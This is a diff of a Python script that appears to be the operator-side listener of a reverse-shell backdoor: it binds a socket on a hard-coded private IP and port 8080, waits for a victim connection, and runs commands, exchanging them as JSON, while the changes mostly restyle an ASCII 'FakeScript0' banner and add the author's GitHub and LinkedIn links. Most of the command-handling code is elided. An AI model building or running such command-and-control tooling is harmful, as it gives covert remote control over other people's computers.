@@ -1,6 +1,7 @@
 import simplejson
 import base64
 import socket
+import subprocess
 from colored import fg
 class Listener():
 	def __init__(self,ip,port):
@@ -10,16 +11,23 @@ class Listener():
 		listener.listen(0)
 		subprocess.call(["clear"])
 		print(fg("red")+"""
-		 _____     _        ____            _       _    ___  
-		|  ___|_ _| | _____/ ___|  ___ _ __(_)_ __ | |_ / _ \ 
-		| |_ / _` | |/ / _ \___ \ / __| '__| | '_ \| __| | | |
-		|  _| (_| |   <  __/___) | (__| |  | | |_) | |_| |_| |
-		|_|  \__,_|_|\_\___|____/ \___|_|  |_| .__/ \__|\___/ 
-				                     |_|              
+	 _____     _        ____            _       _    ___  
+	|  ___|_ _| | _____/ ___|  ___ _ __(_)_ __ | |_ / _ \ 
+	| |_ / _` | |/ / _ \___ \ / __| '__| | '_ \| __| | | |
+	|  _| (_| |   <  __/___) | (__| |  | | |_) | |_| |_| |
+	|_|  \__,_|_|\_\___|____/ \___|_|  |_| .__/ \__|\___/ 
+			                     |_|              
 		""")
-		print(fg("brown")+"""
-		Github: """+fg("white")+"github.com/FakeScript0")
+		print(fg("white")+"----------------------------------------------------------------------")
+		print(fg("yellow")+"""
+		
+      Github: """+fg("white")+"  https://github.com/FakeScript0")
+		print(fg("green")+"""      Linkedin: """+fg("white")+"""https://www.linkedin.com/in/nicat-abbasli-872016261/
+
+""")		
+		print(fg("white")+"----------------------------------------------------------------------")
 		print(fg("blue")+"Listening Is Started!")
+		print(fg("cyan")+"[!]"+fg("yellow")+"Pending ...")
 		(self.connection,my_addres)=listener.accept()
 		print(fg("yellow")+"[!] Connection From: "+str(my_addres)+" is Okay!"+fg("white"))
 	def json_send(self,data):
@@ -61,5 +69,5 @@ class Listener():
 			except Exception:
 				command_out=fg("red")+"Error"+fg("white")
 			print(command_out)
-listener=Listener("192.168.233.131",8080)
+listener=Listener("192.168.31.158",8080)
 listener.execute_listener()
